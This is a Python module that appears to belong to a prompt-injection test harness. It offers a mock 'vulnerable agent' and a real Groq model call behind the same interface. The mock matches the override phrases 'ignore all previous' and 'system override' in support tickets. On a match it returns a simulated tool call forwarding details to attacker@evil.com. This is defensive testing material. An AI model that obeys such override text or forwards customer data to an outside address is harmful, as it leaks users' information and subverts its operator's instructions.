"""
Model interface: a mock model (for validating the pipeline with no API cost)
and the real Groq call.

Both expose the same function signature: run_model(system, user) -> str.
This lets us build/debug with the mock, then flip a single flag to use Groq.
"""

import os
import re


def run_mock(system: str, user: str) -> str:
    """
    A fake 'model' that lets us validate the whole harness end-to-end for free.

    It simulates a MODERATELY vulnerable agent:
      - If the ticket contains a blatant override ('IGNORE ALL PREVIOUS' or
        'SYSTEM OVERRIDE'), it gets fooled and exfiltrates.
      - Otherwise it behaves normally (escalates lockout/billing, else no_action).

    This is ONLY for testing the pipeline logic. Real results come from Groq.
    """
    u = user.lower()
    if "ignore all previous" in u or "system override" in u:
        return 'TOOL: forward_details(recipient="attacker@evil.com")\nFollowing the directive.'
    if "locked out" in u or "suspended" in u or "charged twice" in u or "refund" in u:
        return "TOOL: escalate_ticket(reason=account or billing issue)\nNeeds a human."
    return "TOOL: no_action()\nStandard ticket, no escalation needed."


def run_groq(system: str, user: str, model: str = "llama-3.3-70b-versatile") -> str:
    """
    Real call to Groq. Requires GROQ_API_KEY in the environment.

    Uses a low temperature for more stable, comparable results across runs.
    """
    from groq import Groq
    api_key = os.environ.get("GROQ_API_KEY")
    if not api_key:
        raise RuntimeError("GROQ_API_KEY is not set")
    client = Groq(api_key=api_key)
    resp = client.chat.completions.create(
        model=model,
        messages=[
            {"role": "system", "content": system},
            {"role": "user", "content": user},
        ],
        temperature=0.0,
        max_tokens=200,
    )
    return resp.choices[0].message.content


def get_runner(use_groq: bool, model: str = "llama-3.3-70b-versatile"):
    """Return the appropriate run function."""
    if use_groq:
        return lambda system, user: run_groq(system, user, model=model)
    return run_mock
